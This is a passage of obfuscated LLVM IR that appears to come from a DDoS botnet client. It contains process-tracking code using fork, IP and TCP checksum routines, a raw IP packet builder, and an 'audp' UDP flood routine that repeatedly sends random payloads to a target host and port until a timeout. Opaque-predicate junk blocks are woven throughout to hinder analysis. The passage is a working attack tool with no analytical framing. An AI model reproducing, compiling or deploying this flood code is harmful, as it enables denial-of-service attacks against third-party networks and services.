  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #6
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* @x.31
  %20 = load i32, i32* @y.32
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %4, align 4
  %28 = icmp sgt i32 %27, 0
  %29 = load i32, i32* @x.31
  %30 = load i32, i32* @y.32
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %60

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* @x.31
  %39 = load i32, i32* @y.32
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i16*, i16** %3, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i64
  %50 = load i64, i64* %5, align 8
  %51 = add i64 %50, %49
  store i64 %51, i64* %5, align 8
  %52 = load i32, i32* @x.31
  %53 = load i32, i32* @y.32
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %originalBBpart26, %originalBBpart2
  br label %61

; <label>:61:                                     ; preds = %originalBBpart219, %60
  %62 = load i64, i64* %5, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %87

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @x.31
  %67 = load i32, i32* @y.32
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %65
  %74 = load i64, i64* %5, align 8
  %75 = and i64 %74, 65535
  %76 = load i64, i64* %5, align 8
  %77 = lshr i64 %76, 16
  %78 = add i64 %75, %77
  store i64 %78, i64* %5, align 8
  %79 = load i32, i32* @x.31
  %80 = load i32, i32* @y.32
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart219, label %originalBB8alteredBB

originalBBpart219:                                ; preds = %originalBB8
  br label %61

; <label>:87:                                     ; preds = %61
  %88 = load i64, i64* %5, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %18
  %91 = load i32, i32* %4, align 4
  %92 = icmp sgt i32 %91, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %93 = load i16*, i16** %3, align 8
  %94 = bitcast i16* %93 to i8*
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i64
  %97 = load i64, i64* %5, align 8
  %_ = shl i64 %97, %96
  %_2 = sub i64 %97, %96
  %gen = mul i64 %_2, %96
  %_3 = sub i64 %97, %96
  %gen4 = mul i64 %_3, %96
  %98 = add i64 %97, %96
  store i64 %98, i64* %5, align 8
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %65
  %99 = load i64, i64* %5, align 8
  %100 = and i64 %99, 65535
  %101 = load i64, i64* %5, align 8
  %_9 = sub i64 %101, 16
  %gen10 = mul i64 %_9, 16
  %_11 = sub i64 %101, 16
  %gen12 = mul i64 %_11, 16
  %_13 = sub i64 %101, 16
  %gen14 = mul i64 %_13, 16
  %_15 = shl i64 %101, 16
  %102 = lshr i64 %101, 16
  %_16 = sub i64 0, %100
  %gen17 = add i64 %_16, %102
  %103 = add i64 %100, %102
  store i64 %103, i64* %5, align 8
  br label %originalBB8
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.35
  %7 = load i32, i32* @y.36
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.35
  %57 = load i32, i32* @y.36
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 0, %71
  %gen = add i8 %_, -16
  %72 = and i8 %71, -16
  %_1 = shl i8 %72, 5
  %_2 = sub i8 %72, 5
  %gen3 = mul i8 %_2, 5
  %_4 = sub i8 0, %72
  %gen5 = add i8 %_4, 5
  %_6 = sub i8 %72, 5
  %gen7 = mul i8 %_6, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_8 = sub i8 0, %76
  %gen9 = add i8 %_8, 15
  %77 = and i8 %76, 15
  %_10 = sub i8 %77, 64
  %gen11 = mul i8 %_10, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_12 = shl i64 20, %82
  %_13 = sub i64 20, %82
  %gen14 = mul i64 %_13, %82
  %_15 = sub i64 20, %82
  %gen16 = mul i64 %_15, %82
  %_17 = sub i64 20, %82
  %gen18 = mul i64 %_17, %82
  %_19 = sub i64 20, %82
  %gen20 = mul i64 %_19, %82
  %_21 = shl i64 20, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %56

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* @x.37
  %37 = load i32, i32* @y.38
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* %8, align 4
  %45 = trunc i32 %44 to i16
  %46 = call zeroext i16 @htons(i16 zeroext %45) #9
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %46, i16* %47, align 2
  %48 = load i32, i32* @x.37
  %49 = load i32, i32* @y.38
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %56

; <label>:56:                                     ; preds = %originalBBpart2, %31
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %59 = call i32 @getHost(i8* %57, %struct.in_addr* %58)
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %56
  br label %535

; <label>:62:                                     ; preds = %56
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %64 = getelementptr inbounds [8 x i8], [8 x i8]* %63, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 8, i32 4, i1 false)
  %65 = load i32, i32* %12, align 4
  store i32 %65, i32* %14, align 4
  %66 = load i32, i32* %10, align 4
  %67 = icmp eq i32 %66, 32
  br i1 %67, label %68, label %230

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.37
  %70 = load i32, i32* @y.38
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %77, i32* %15, align 4
  %78 = load i32, i32* %15, align 4
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.37
  %81 = load i32, i32* @y.38
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %79, label %105, label %88

; <label>:88:                                     ; preds = %originalBBpart24
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i32, i32* @x.37
  %98 = load i32, i32* @y.38
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %535

; <label>:105:                                    ; preds = %originalBBpart24
  %106 = load i32, i32* %11, align 4
  %107 = add nsw i32 %106, 1
  %108 = sext i32 %107 to i64
  %109 = call noalias i8* @malloc(i64 %108) #6
  store i8* %109, i8** %16, align 8
  %110 = load i8*, i8** %16, align 8
  %111 = icmp eq i8* %110, null
  br i1 %111, label %112, label %129

; <label>:112:                                    ; preds = %105
  %113 = load i32, i32* @x.37
  %114 = load i32, i32* @y.38
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %112
  %121 = load i32, i32* @x.37
  %122 = load i32, i32* @y.38
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %535

; <label>:129:                                    ; preds = %105
  %130 = load i32, i32* @x.37
  %131 = load i32, i32* @y.38
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = load i8*, i8** %16, align 8
  %139 = load i32, i32* %11, align 4
  %140 = add nsw i32 %139, 1
  %141 = sext i32 %140 to i64
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 %141, i32 1, i1 false)
  %142 = load i8*, i8** %16, align 8
  %143 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %142, i32 %143)
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %145 = load i32, i32* %9, align 4
  %146 = add nsw i32 %144, %145
  store i32 %146, i32* %17, align 4
  store i32 0, i32* %18, align 4
  %147 = load i32, i32* @x.37
  %148 = load i32, i32* @y.38
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart235, label %originalBB14alteredBB

originalBBpart235:                                ; preds = %originalBB14
  br label %155

; <label>:155:                                    ; preds = %226, %originalBBpart247, %originalBBpart235
  %156 = load i32, i32* @x.37
  %157 = load i32, i32* @y.38
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %155
  %164 = load i32, i32* %15, align 4
  %165 = load i8*, i8** %16, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %169 = call i64 @sendto(i32 %164, i8* %165, i64 %167, i32 0, %struct.sockaddr* %168, i32 16)
  %170 = load i32, i32* %18, align 4
  %171 = load i32, i32* %14, align 4
  %172 = icmp eq i32 %170, %171
  %173 = load i32, i32* @x.37
  %174 = load i32, i32* @y.38
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %172, label %181, label %226

; <label>:181:                                    ; preds = %originalBBpart239
  %182 = load i32, i32* %8, align 4
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %204

; <label>:184:                                    ; preds = %181
  %185 = load i32, i32* @x.37
  %186 = load i32, i32* @y.38
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %184
  %193 = call i32 @rand_cmwc()
  %194 = trunc i32 %193 to i16
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  %196 = load i32, i32* @x.37
  %197 = load i32, i32* @y.38
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %204

; <label>:204:                                    ; preds = %originalBBpart243, %181
  %205 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %206 = load i32, i32* %17, align 4
  %207 = icmp sgt i32 %205, %206
  br i1 %207, label %208, label %209

; <label>:208:                                    ; preds = %204
  br label %229

; <label>:209:                                    ; preds = %204
  %210 = load i32, i32* @x.37
  %211 = load i32, i32* @y.38
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %209
  store i32 0, i32* %18, align 4
  %218 = load i32, i32* @x.37
  %219 = load i32, i32* @y.38
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %155

; <label>:226:                                    ; preds = %originalBBpart239
  %227 = load i32, i32* %18, align 4
  %228 = add i32 %227, 1
  store i32 %228, i32* %18, align 4
  br label %155

; <label>:229:                                    ; preds = %208
  br label %535

; <label>:230:                                    ; preds = %62
  %231 = load i32, i32* @x.37
  %232 = load i32, i32* @y.38
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
